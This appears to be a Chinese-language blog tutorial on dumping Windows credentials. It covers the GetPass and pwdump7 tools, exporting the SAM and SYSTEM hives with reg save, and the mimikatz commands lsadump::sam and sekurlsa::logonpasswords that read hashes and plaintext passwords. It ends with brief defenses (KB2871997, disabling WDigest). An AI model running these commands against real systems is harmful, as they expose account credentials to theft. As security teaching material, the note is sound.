ailx10说：这篇是2022年1月之前写的，后来又改过。Windows 密码这一篇，我把几种看似都叫“取密码”的方式并排试：有的看明文，有的导散列，有的离线处理 SAM 和 SYSTEM，还有的去看运行中的登录材料。以前容易把工具输出都当成同一种东西，做过以后才明白存储位置、格式和权限各不一样。笔记后面也提到补丁和 WDigest，想把观察接回防护。它更像一次给凭据分门别类的练习；看见一串字符时，先知道它是什么、来自哪，而不是立刻说所有用户的口令都到手了。

---

Windows 凭据可能以散列或其他形式存储，也可能出现在受保护的进程内存中。本文区分 SAM、离线文件和 LSASS 的历史实验，不将散列称为可逆加密。

```
username:rid:lm-hash:nt-hash
```

SAM 中包含本地账户相关信息；域账户数据库和 LSASS 内存是不同来源。读取内容取决于版本、权限与保护机制，不能假定一定包含所有用户明文。

## 1、GetPass

下载地址：看雪论坛（[GetPass](https://bbs.pediy.com/thread-163383.htm)）

原文报告 GetPass 输出凭据信息；能否获取明文取决于环境，不能断言覆盖所有用户。

![](/notes-assets/0489c59d70dec5a5593d.webp)

## 2、pwndump7

下载地址：官网（[pwdump\_7官网](https://www.tarasco.org/security/pwdump_7/)）

pwdump7 的历史示例输出散列；散列不是明文，候选口令匹配也不是可逆解密。

![](/notes-assets/18aab72404379fd82078.webp)

## 3、通过sam和system文件抓取

第一步：导出SAM文件和System文件

```
reg save hklm\sam sam.hive
reg save hklm\system system.hive
```

![](/notes-assets/075a7224a875e5d1e759.webp)

第二步：使用mimikatz读取SAM文件和System文件

mimikatz下载地址：github（[github项目官方地址](https://github.com/gentilkiwi/mimikatz/releases)）

下载完后，把上面的2个文件，放到mimikatz的项目目录下。直接双击运行，然后输入下面的命令，也是拿到 hash，稍微逊色一点点～

```
lsadump::sam /sam:sam.hive /system:syytem.hive
```

![](/notes-assets/3f0d79b9d3e9124d23f9.jpg)

也可以直接通过mimikatz读取本地SAM文件，导出hash三部曲～

第一步：输入`privilege::debug`

![](/notes-assets/eff09b629cbf52fb5403.webp)

第二步：输入`token::elevate` （提权）

![](/notes-assets/fa5a5b78760561033d2a.webp)

第三步：输入`lsadump::sam`（导出hash）

![](/notes-assets/ca216a847f38ec196223.webp)

## 4、使用mimikatz在线读取hash和明文密码

Mimikatz 可对符合权限和版本条件的凭据材料进行分析；原文的 K8S 应为 Kerberos。能否取得明文需要检查实际配置。

```
mimikatz.exe "privilege::debug" "log" "sekurlsa::logonpasswords"
```

![](/notes-assets/b7055d2ba51332469b7a.jpg)

## 5、单机密码抓取的防范

- 安装微软发布的KB2871997补丁
- 关闭Wdigest功能（Windows Server 2012版本以上默认关闭）
